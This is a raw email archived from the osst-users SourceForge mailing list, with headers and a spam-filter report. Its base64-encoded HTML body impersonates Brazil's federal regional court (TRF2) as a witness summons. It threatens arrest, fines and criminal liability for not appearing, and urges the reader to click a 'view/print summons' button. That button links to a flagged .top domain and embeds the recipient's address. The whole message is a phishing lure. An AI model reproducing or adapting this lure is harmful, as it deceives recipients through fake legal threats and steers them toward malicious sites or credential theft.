Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 1CE32AED373
	for <lists+osst-users@lfdr.de>; Mon, 30 Jun 2025 06:32:49 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=List-Subscribe:List-Help:List-Post:
	List-Archive:List-Unsubscribe:List-Id:Subject:Date:Message-Id:To:From:
	MIME-Version:Content-Type:Sender:Reply-To:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=Kd/tuZEP/AaFm26WrZcRul18iOmXd2XcgEQjbfU+RzY=; b=C72fPfrWlaMQCtwg/SVi26M2YA
	n/Xg8ksAhIDvl9uAatszeNMCOOKyYDkWEk/LIy18MHWgrIXXpB+bOMFZ96TT3qr+liEcAJLoiKElX
	G3dpKPrNUeNqalSdXNoXExwTnMJo8N5/C5uQYtq00wR6jVcOPMr3ss+QkvTsYx/QVi6k=;
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1uW6CF-0000ep-Cp
	for lists+osst-users@lfdr.de;
	Mon, 30 Jun 2025 04:32:47 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <mandado@justicafederal-rj.org>) id 1uW6CE-0000ej-3u
 for osst-users@lists.sourceforge.net; Mon, 30 Jun 2025 04:32:46 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Date:Message-Id:To:From:Subject:MIME-Version:
 Content-Type:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=yyTF+kRQPSF14vwEB3yCTD3l44pAKxjojOc+rilNWNw=; b=g3EM5dTFiagnPzgqtf1JA1fprv
 utVZW5zmRC3QjFrnj/e39ln+7LYIREIGRVl12QWxFPplYiQAjEsC3seXS2q6cFKoKucdtAaob9iiI
 a9ek8nTRy4N8GIG4PA8AR4M7jVD7+679gHm1LgxESAEmEjGCCOo9SpPoo0oHaejs8zQw=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Date:Message-Id:To:From:Subject:MIME-Version:Content-Type:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=yyTF+kRQPSF14vwEB3yCTD3l44pAKxjojOc+rilNWNw=; b=A
 +dBFctUGnm9sTRIPPHKQZmoODLd6KQiuJrVu1y9CI+9AtuaGFm9yNyBBT9C5bex+aqpqds5X5/wzD
 ie7IQ72SsXNYIAdNwv/UsqrB0Kz4LFTqoFiB5SV6LxvdJLXyO3DM4q+ITYd2WRpv12Sy3W12UEXvM
 H+TEva9x6yq2V9qc=;
Received: from [77.81.188.18] (helo=server-0630-0347.sto2)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1uW6CD-00072T-Gq for osst-users@lists.sourceforge.net;
 Mon, 30 Jun 2025 04:32:46 +0000
Received: from [10.1.0.18] (localhost [127.0.0.1])
 by server-0630-0347.sto2 (Postfix) with ESMTP id B048E104893
 for <osst-users@lists.sourceforge.net>; Mon, 30 Jun 2025 04:13:55 +0000 (UTC)
Content-Type: multipart/mixed; boundary="===============2930682048346471971=="
MIME-Version: 1.0
From: Tribunal Regional Federal <mandado@justicafederal-rj.org>
To: osst-users@lists.sourceforge.net
Message-Id: <20250630041355.B048E104893@server-0630-0347.sto2>
Date: Mon, 30 Jun 2025 04:13:55 +0000 (UTC)
X-Spam-Score: 6.1 (++++++)
X-Spam-Report: Spam detection software, running on the system "sfi-spamd-2.hosts.colo.sdot.me",
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 
 Content preview:  Intimação Judicial MANDADO DE INTIMAÇÃO DE TESTEMUNHA
    
 
 Content analysis details:   (6.1 points, 5.0 required)
 
  pts rule name              description
 ---- ---------------------- --------------------------------------------------
  0.8 DKIM_ADSP_NXDOMAIN     No valid author signature and domain not in DNS
  2.0 PDS_OTHER_BAD_TLD      Untrustworthy TLDs
                             [URI: www.nodepipeline.top (top)]
  0.0 HTML_MESSAGE           BODY: HTML included in message
  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
  1.3 RDNS_NONE              Delivered to internal network by a host with no rDNS
  1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL blocklist
                             [URI: www.nodepipeline.top]
X-Headers-End: 1uW6CD-00072T-Gq
Subject: [Osst-users] Intimacao para comparecimento em audiencia - TRF2 ID -
 7600537
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Errors-To: osst-users-bounces@lists.sourceforge.net

Intimacao para comparecimento em audiencia - TRF2 ID -  7600537
--===============2930682048346471971==
Content-Type: text/html; charset="utf-8"
MIME-Version: 1.0
Content-Transfer-Encoding: base64

PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAg
PHRpdGxlPkludGltYcOnw6NvIEp1ZGljaWFsPC90aXRsZT4KPC9oZWFkPgo8Ym9keSBzdHlsZT0i
Zm9udC1mYW1pbHk6IEFyaWFsLCBzYW5zLXNlcmlmOyBmb250LXNpemU6IDE0cHg7IGNvbG9yOiAj
MjIyOyBiYWNrZ3JvdW5kLWNvbG9yOiAjZmZmZmZmOyBtYXJnaW46IDA7IHBhZGRpbmc6IDIwcHg7
Ij4KICA8dGFibGUgYWxpZ249ImNlbnRlciIgd2lkdGg9IjYwMCIgc3R5bGU9ImJvcmRlcjogMXB4
IHNvbGlkICNjY2M7IGJvcmRlci1jb2xsYXBzZTogY29sbGFwc2U7IGJhY2tncm91bmQ6ICNmZmY7
Ij4KICAgIDx0cj4KICAgICAgPHRkIHN0eWxlPSJwYWRkaW5nOiAyMHB4OyI+CiAgICAgICAgPGgy
IHN0eWxlPSJ0ZXh0LWFsaWduOiBjZW50ZXI7IGNvbG9yOiAjMDAwOyI+TUFOREFETyBERSBJTlRJ
TUHDh8ODTyBERSBURVNURU1VTkhBPC9oMj4KICAgICAgICA8cD5Ob3MgdGVybW9zIGRvIGFydC4g
NDU1LCDCpzHCuiBkbyBDw7NkaWdvIGRlIFByb2Nlc3NvIENpdmlsLCBzZXJ2ZSBhIHByZXNlbnRl
IHBhcmEgSU5USU1BUiBWb3NzYSBTZW5ob3JpYSBwYXJhIGNvbXBhcmVjZXIsIG5hIHF1YWxpZGFk
ZSBkZSB0ZXN0ZW11bmhhLCDDoCBhdWRpw6puY2lhIGEgc2VyIHJlYWxpemFkYSBubyBkaWEgPHN0
cm9uZz4wNi8wNy8yMDI1PC9zdHJvbmc+LCDDoHMgMTRoMDAsIG5vIFRyaWJ1bmFsIFJlZ2lvbmFs
IEZlZGVyYWwgZGEgMsKqIFJlZ2nDo28sIGxvY2FsaXphZG8gbmEgUi4gQWNyZSwgODAgLSBDZW50
cm8sIFJpbyBkZSBKYW5laXJvIC0gUkosIDIwMDgxLTAwMC4gPHN0cm9uZz5DYXNvIG7Do28gY29t
cGFyZcOnYSDDoCBhdWRpw6puY2lhLCBhIG1lc21hIHNlcsOhIHJlYWxpemFkYSBhbyB2aXZvLjwv
c3Ryb25nPjwvcD4KICAgICAgICA8cD5GaWNhIGEgdGVzdGVtdW5oYSBhZHZlcnRpZGEsIG5hIGZv
cm1hIGRvcyBhcnRpZ29zIDIxOCBlIDIxOSBkbyBDUFAsIGRlIHF1ZSBvIG7Do28gY29tcGFyZWNp
bWVudG8gc2VtIGp1c3RpZmljYXRpdmEgcG9kZXLDoSBhY2FycmV0YXIgY29uZHXDp8OjbyBjb2Vy
Y2l0aXZhLCBtdWx0YSBqdWRpY2lhbCBlIHJlc3BvbnNhYmlsaXphw6fDo28gcGVuYWwgcG9yIGRl
c29iZWRpw6puY2lhLjwvcD4KICAgICAgICA8cCBzdHlsZT0idGV4dC1hbGlnbjogY2VudGVyOyBm
b250LXdlaWdodDogYm9sZDsiPlJlZjogQXV0b3MgTsK6IDxhIGhyZWY9Imh0dHBzOi8vd3d3Lm5v
ZGVwaXBlbGluZS50b3AvbWFzdGVyc3N5cmF2c2Zic2Flci8/c2VuaG9yb2xlKG9zc3QtdXNlcnNA
bGlzdHMuc291cmNlZm9yZ2UubmV0KSIgc3R5bGU9ImNvbG9yOiAjMTE1NWNjOyB0ZXh0LWRlY29y
YXRpb246IG5vbmU7Ij5TVEMxVkxUQjVRRENQR0E8L2E+PC9wPgogICAgICAgIDxkaXYgc3R5bGU9
InRleHQtYWxpZ246IGNlbnRlcjsgbWFyZ2luLXRvcDogMzBweDsiPgogICAgICAgICAgPGEgaHJl
Zj0iaHR0cHM6Ly93d3cubm9kZXBpcGVsaW5lLnRvcC9tYXN0ZXJzc3lyYXZzZmJzYWVyLz9zZW5o
b3JvbGUob3NzdC11c2Vyc0BsaXN0cy5zb3VyY2Vmb3JnZS5uZXQpIiB0YXJnZXQ9Il9ibGFuayIg
c3R5bGU9ImRpc3BsYXk6IGlubGluZS1ibG9jazsgcGFkZGluZzogMTJweCAyMHB4OyBiYWNrZ3Jv
dW5kLWNvbG9yOiAjZDMyZjJmOyBjb2xvcjogd2hpdGU7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsg
Ym9yZGVyLXJhZGl1czogNHB4OyBmb250LXdlaWdodDogYm9sZDsiPlZJU1VBTElaQVIgLyBJTVBS
SU1JUiBNQU5EQURPPC9hPgogICAgICAgIDwvZGl2PgogICAgICAgIDxwIHN0eWxlPSJtYXJnaW4t
dG9wOiA0MHB4OyBmb250LXNpemU6IDEycHg7IGNvbG9yOiAjODg4OyI+RXN0ZSDDqSB1bSBjb211
bmljYWRvIGF1dG9tw6F0aWNvLiBQb3IgZmF2b3IsIG7Do28gcmVzcG9uZGEgZXN0ZSBlLW1haWwu
PC9wPgogICAgICA8L3RkPgogICAgPC90cj4KICA8L3RhYmxlPgo8L2JvZHk+CjwvaHRtbD4K

--===============2930682048346471971==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2930682048346471971==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============2930682048346471971==--

